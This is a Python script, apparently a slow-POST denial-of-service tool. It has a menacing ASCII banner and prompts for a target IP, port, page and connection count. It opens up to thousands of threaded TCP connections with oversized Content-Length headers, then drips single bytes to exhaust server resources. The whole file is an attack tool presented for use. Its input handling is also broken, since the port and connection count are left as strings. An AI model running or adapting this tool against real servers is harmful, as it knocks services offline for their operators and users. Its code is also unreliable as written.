import socket
import time
import threading
#导入模块

print("\033[31m  ___  ____ ____       ____  _   _ _    _          ____            _        \033[0m")
print("\033[31m / _ \| __ ) ___|     / ___|| |_(_) | _| |__      / ___| _   _ ___| |_ ___  _ __ ___  \033[0m")
print("\033[31m| | | |  _ \___ \ ____\___ \| __| | |/ / '_ \ ____\___ \| | | / __| __/ _ \| '_ ` _ \ \033[0m")
print("\033[31m| |_| | |_) |__) |_____|__) | |_| |   <| | | |_____|__) | |_| \__ \ ||  __/| | | | | |\033[0m")
print("\033[31m \___/|____/____/     |____/ \__|_|_|\_\_| |_|    |____/ \__, |___/\__\___||_| |_| |_|\033[0m")
print("\033[31m                                                         |___/             \033[0m")
print("""
                          __----~~~~~~~~~~~------___
                                   .  .   ~~//====......          __--~ ~~
                   -.            \_|//     |||\\  ~~~~~~::::... /~
                ___-==_       _-~o~  \/    |||  \\            _/~~-
        __---~~~.==~||\=_    -_--~/_-~|-   |\\   \\        _/~
    _-~~     .=~    |  \\-_    '-~7  /-   /  ||    \      /
  .~       .~       |   \\ -_    /  /-   /   ||      \   /
 /  ____  /         |     \\ ~-_/  /|- _/   .||       \ /
 |~~    ~~|--~~~~--_ \     ~==-/   | \~--===~~        .\
          '         ~-|      /|    |-~\~~       __--~~
                      |-~~-_/ |    |   ~\_   _-~            /\
                           /  \     \__   \/~                \__
                       _--~ _/ | .-~~____--~-/                  ~~==.
                      ((->/~   '.|||' -_|    ~~-/ ,              . _||
                                 -_     ~\      ~~---l__i__i__i--~~_/
                                 _-~-__   ~)  \--______________--~~
                               //.-~~~-~_--~- |-------~~~~~~~~
                                      //.-~~~--\ """)
print("\033[34m[*]Loading weapons, start releasing attacks immediately\033[0m")
print("\033[34m[*]Enter the number of release test attacks\033[0m")
MAX_CONN = 200000  # 最大连接数
MAX_CONN = input()
PORT = 80
print("\033[34m[*]Enter the development port for releasing particles\033[0m")
PORT = input()
HOST = "127.0.0.1"  # 目标IP或域名.
print("\033[34m[*]enter ip\033[0m")
HOST = input()
PAGE = "/index.php"  # 目标页面
print("enter PAGE")
PAGE = input()
buf = ("POST %s HTTP/1.1\r\n"
       "Host: %s\r\n"
       "Content-Length: 10000000\r\n"  # 实体数据大小
       "Cookie: dklkt_dos_test\r\n"
       "\r\n" % (PAGE, HOST))

socks = []

def conn_thread():
    global socks
    for i in range(0, MAX_CONN):  # MAX_CONN允许最大连接数
        # AF_INET 表示 IPv4 地址，创建 TCP套接字，必须使用 SOCK_STREAM 作为套接字类型
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((HOST, PORT))
            s.send(buf.encode())
            print("[+] 成功发送buf!,conn=%d\n" % i)
            socks.append(s)
        except Exception as ex:
            print("[-] 无法连接服务器或发送错误:%s" % ex)
            time.sleep(1)  # 暂停1秒

def send_thread():
    global socks
    while True:
        for s in socks:
            try:
                s.send("f".encode())
            except Exception as ex:
                print("[-] 发送异常:%s\n" % ex)
                socks.remove(s)
                s.close()
        time.sleep(1)


# 建立多线程
conn_th = threading.Thread(target=conn_thread, args=())
send_th = threading.Thread(target=send_thread, args=())
# 开启线程
conn_th.start()
send_th.start()

conn_th2 = threading.Thread(target=conn_thread, args=())
send_th2 = threading.Thread(target=send_thread, args=())
conn_th2.start()
send_th2.start()
